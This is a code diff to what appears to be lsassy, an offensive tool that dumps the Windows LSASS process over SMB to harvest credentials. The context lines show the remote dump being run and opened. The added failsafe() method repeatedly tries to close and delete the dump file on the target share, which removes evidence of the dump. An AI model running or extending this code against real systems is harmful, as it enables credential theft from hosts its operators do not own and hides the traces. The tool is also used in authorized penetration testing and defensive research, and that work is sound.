@@ -3,6 +3,7 @@ import importlib
 import base64
 import random
 import string
+import time
 
 from lsassy.impacketfile import ImpacketFile
 
@@ -22,6 +23,7 @@ class IDumpMethod:
     def __init__(self, session, *args, **kwargs):
         self._session = session
         self._file = ImpacketFile(self._session)
+        self._file_handle = None
 
     def get_exec_method(self, exec_method, no_powershell=False):
         try:
@@ -124,17 +126,47 @@ class IDumpMethod:
             logging.debug("Transformed command: {}".format(exec_command))
             try:
                 exec_method.exec(exec_command)
-                file = self._file.open(self.dump_share, self.dump_path, self.dump_name)
-                if file is None:
+                self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name)
+                if self._file_handle is None:
                     logging.error("Failed to dump lsass")
                     self.clean()
                     return None
                 logging.success("Lsass dumped successfully in C:{}{}".format(self.dump_path, self.dump_name))
                 self.clean()
-                return file
+                return self._file_handle
             except Exception:
                 logging.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
                 continue
         logging.error("All execution methods have failed")
         self.clean()
         return None
+
+    def failsafe(self):
+        t = time.time()
+        timeout = 3
+        while True:
+            if self._file_handle is not None:
+                try:
+                    self._file_handle.close()
+                    self._session.smb_session.deleteFile(self._file_handle._share_name, self._file_handle._fpath)
+                    logging.debug("Lsass dump successfully deleted")
+                except Exception as e:
+                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
+                        return True
+                    if time.time() - t > timeout:
+                        logging.warning("Lsass dump wasn't removed in {}{}".format(self._file_handle._share_name, self._file_handle._fpath), exc_info=True)
+                        return None
+                    logging.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self._file_handle._share_name, self._file_handle._fpath))
+                    time.sleep(0.5)
+            else:
+                try:
+                    self._session.smb_session.deleteFile(self.dump_share, self.dump_path + "/" + self.dump_name)
+                    logging.debug("Lsass dump successfully deleted")
+                except Exception as e:
+                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
+                        return True
+                    if time.time() - t > timeout:
+                        logging.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
+                        return None
+                    logging.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
+                    time.sleep(0.5)
